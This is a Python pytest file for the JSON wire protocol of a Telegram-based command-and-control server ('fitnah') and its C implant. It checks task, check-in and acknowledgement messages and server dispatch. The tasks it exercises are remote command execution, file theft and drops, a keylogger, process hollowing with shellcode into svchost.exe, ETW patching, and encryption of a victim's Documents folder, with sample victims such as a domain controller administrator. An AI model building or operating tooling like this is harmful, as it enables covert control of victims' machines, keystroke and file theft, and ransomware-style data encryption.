"""
Phase 9 — implant protocol tests.

Tests the JSON wire format exchanged between the Python C2 and the C implant.
No real Telegram connection; uses the C2Server directly.
"""
from __future__ import annotations

import asyncio
import json
import uuid

import pytest


# ── wire-format builders (mirror what server.py / implant produce) ────────────

def make_task(command: str, args: dict | None = None, task_id: str | None = None) -> str:
    return json.dumps({
        "type":    "TASK",
        "id":      task_id or str(uuid.uuid4()),
        "command": command,
        "args":    args or {},
    })


def make_checkin(agent_id: str = "agent-001",
                 hostname:  str = "VICTIMBOX",
                 os:        str = "Windows 11 Pro",
                 arch:      str = "x64",
                 username:  str = "CORP\\operator",
                 ip:        str = "10.0.0.50",
                 chat_id:   str = "-100999") -> str:
    return json.dumps({
        "type":     "CHECKIN",
        "agent_id": agent_id,
        "hostname": hostname,
        "os":       os,
        "arch":     arch,
        "username": username,
        "ip":       ip,
        "chat_id":  chat_id,
    })


def make_ack(task_id: str, output: str, status: str = "ok") -> str:
    return json.dumps({
        "type":   "ACK",
        "id":     task_id,
        "status": status,
        "output": output,
    })


# ── TASK wire format ──────────────────────────────────────────────────────────

class TestTaskFormat:
    def test_type_field(self):
        t = json.loads(make_task("exec"))
        assert t["type"] == "TASK"

    def test_id_is_present(self):
        t = json.loads(make_task("exec"))
        assert "id" in t and t["id"]

    def test_custom_id_preserved(self):
        tid = "deadbeef-0000-0000-0000-000000000001"
        t   = json.loads(make_task("exec", task_id=tid))
        assert t["id"] == tid

    def test_exec_args(self):
        t = json.loads(make_task("exec", {"cmd": "ipconfig /all"}))
        assert t["command"] == "exec"
        assert t["args"]["cmd"] == "ipconfig /all"

    def test_ps_args(self):
        t = json.loads(make_task("ps", {"cmd": "Get-Process"}))
        assert t["command"] == "ps"

    def test_download_args(self):
        t = json.loads(make_task("download", {"path": "C:\\secret.txt"}))
        assert t["args"]["path"] == "C:\\secret.txt"

    def test_upload_args(self):
        t = json.loads(make_task("upload", {"path": "C:\\drop.exe", "data": "AAAA"}))
        assert t["args"]["path"] == "C:\\drop.exe"
        assert t["args"]["data"] == "AAAA"

    def test_die_has_no_args(self):
        t = json.loads(make_task("die"))
        assert t["command"] == "die"
        assert t["args"] == {}

    def test_keylogger_action(self):
        for action in ("start", "stop", "dump"):
            t = json.loads(make_task("keylogger", {"action": action}))
            assert t["args"]["action"] == action

    def test_process_hollow_args(self):
        t = json.loads(make_task("process_hollow", {
            "target": "svchost.exe", "shellcode_b64": "AAEC/w==",
        }))
        assert t["args"]["target"] == "svchost.exe"

    def test_encrypt_files_args(self):
        t = json.loads(make_task("encrypt_files", {
            "path": "C:\\Users\\victim\\Documents",
            "ext":  ".enc", "key_b64": "",
        }))
        assert "Documents" in t["args"]["path"]

    def test_json_is_valid(self):
        for cmd in ("exec", "ps", "screenshot", "download", "upload",
                    "keylogger", "etw_patch", "die"):
            raw = make_task(cmd)
            obj = json.loads(raw)
            assert obj["type"] == "TASK"


# ── CHECKIN wire format ───────────────────────────────────────────────────────

class TestCheckinFormat:
    def test_type(self):
        c = json.loads(make_checkin())
        assert c["type"] == "CHECKIN"

    def test_required_fields(self):
        c = json.loads(make_checkin())
        for f in ("agent_id", "hostname", "os", "arch", "username", "ip", "chat_id"):
            assert f in c, f"Missing: {f}"

    def test_values_preserved(self):
        c = json.loads(make_checkin(
            agent_id="op-001", hostname="DC01",
            os="Windows Server 2019", arch="x64",
            username="CORP\\Administrator", ip="192.168.1.1",
            chat_id="-100123",
        ))
        assert c["agent_id"] == "op-001"
        assert c["hostname"] == "DC01"
        assert c["username"] == "CORP\\Administrator"

    def test_chat_id_is_string(self):
        c = json.loads(make_checkin(chat_id="-100999888777"))
        assert isinstance(c["chat_id"], str)

    def test_json_is_valid(self):
        raw = make_checkin()
        json.loads(raw)   # must not raise


# ── ACK wire format ───────────────────────────────────────────────────────────

class TestAckFormat:
    def test_type(self):
        a = json.loads(make_ack("tid-1", "result"))
        assert a["type"] == "ACK"

    def test_id_matches(self):
        tid = "task-abc-123"
        a   = json.loads(make_ack(tid, "output"))
        assert a["id"] == tid

    def test_status_ok(self):
        a = json.loads(make_ack("t", "data"))
        assert a["status"] == "ok"

    def test_output_multiline(self):
        out = "line1\nline2\nline3"
        a   = json.loads(make_ack("t", out))
        assert "\n" in a["output"]

    def test_output_special_chars(self):
        out = 'C:\\Users\\admin > whoami && echo "done"'
        a   = json.loads(make_ack("t", out))
        assert "whoami" in a["output"]

    def test_output_empty(self):
        a = json.loads(make_ack("t", ""))
        assert a["output"] == ""

    def test_json_is_valid(self):
        json.loads(make_ack("tid", "some output with unicode: é"))


# ── C2Server dispatch + ACK resolution ───────────────────────────────────────

class TestC2ServerDispatch:
    """Verify the Python C2Server resolves futures when ACKs arrive."""

    @pytest.mark.asyncio
    async def test_dispatch_resolves_on_ack(self):
        from unittest.mock import AsyncMock, MagicMock
        from fitnah.c2.server import C2Server

        router = MagicMock()
        router.send = AsyncMock(return_value=True)
        server = C2Server(router, task_timeout=5)

        # Start dispatch (creates a pending future internally)
        dispatch_task = asyncio.create_task(
            server.dispatch("agent-001", "-100999", "exec", {"cmd": "whoami"})
        )
        # yield to let dispatch run and register the task
        await asyncio.sleep(0)

        # find the pending task id
        assert len(server._pending) == 1
        tid = next(iter(server._pending))

        # simulate the implant sending back an ACK
        ack_msg = {
            "text":      make_ack(tid, "nt authority\\system"),
            "chat_id":   "-100999",
            "sender_id": "agent-001",
        }
        await server._handle_incoming(ack_msg)

        result = await dispatch_task
        assert result["status"] == "ok"
        assert "system" in result["output"].lower()

    @pytest.mark.asyncio
    async def test_dispatch_times_out(self):
        from unittest.mock import AsyncMock, MagicMock
        from fitnah.c2.server import C2Server

        router = MagicMock()
        router.send = AsyncMock(return_value=True)
        server = C2Server(router, task_timeout=0.1)

        result = await server.dispatch("agent-001", "-100", "exec", {})
        assert result["status"] == "timeout"

    @pytest.mark.asyncio
    async def test_ack_for_unknown_task_is_ignored(self):
        from unittest.mock import AsyncMock, MagicMock
        from fitnah.c2.server import C2Server

        router = MagicMock()
        router.send = AsyncMock(return_value=True)
        server = C2Server(router)

        # ACK for a task that was never dispatched — should not raise
        ack_msg = {
            "text":    make_ack("nonexistent-id", "output"),
            "chat_id": "-100",
        }
        await server._handle_incoming(ack_msg)   # must not raise
        assert server.stats()["acked"] == 0

    @pytest.mark.asyncio
    async def test_stats_increment_on_ack(self):
        from unittest.mock import AsyncMock, MagicMock
        from fitnah.c2.server import C2Server

        router = MagicMock()
        router.send = AsyncMock(return_value=True)
        server = C2Server(router, task_timeout=5)

        dispatch_task = asyncio.create_task(
            server.dispatch("a", "c", "ps", {"cmd": "whoami"})
        )
        await asyncio.sleep(0)
        tid = next(iter(server._pending))
        await server._handle_incoming({
            "text": make_ack(tid, "result"), "chat_id": "c",
        })
        await dispatch_task

        s = server.stats()
        assert s["dispatched"] == 1
        assert s["acked"] == 1

    @pytest.mark.asyncio
    async def test_pending_cleared_after_ack(self):
        from unittest.mock import AsyncMock, MagicMock
        from fitnah.c2.server import C2Server

        router = MagicMock()
        router.send = AsyncMock(return_value=True)
        server = C2Server(router, task_timeout=5)

        dispatch_task = asyncio.create_task(
            server.dispatch("a", "c", "exec", {})
        )
        await asyncio.sleep(0)
        tid = next(iter(server._pending))
        await server._handle_incoming({
            "text": make_ack(tid, "done"), "chat_id": "c",
        })
        await dispatch_task
        assert len(server._pending) == 0

    @pytest.mark.asyncio
    async def test_operator_command_dispatched_to_handler(self):
        from unittest.mock import AsyncMock, MagicMock
        from fitnah.c2.server import C2Server

        router = MagicMock()
        router.send = AsyncMock(return_value=True)
        server = C2Server(router)

        calls = []
        async def _handler(**kwargs):
            calls.append(kwargs)

        server.register_handler("sessions", _handler)
        await server._handle_incoming({
            "text": "sessions -l", "chat_id": "-100", "sender_id": "1234",
        })
        assert len(calls) == 1
        assert calls[0]["args"] == "-l"
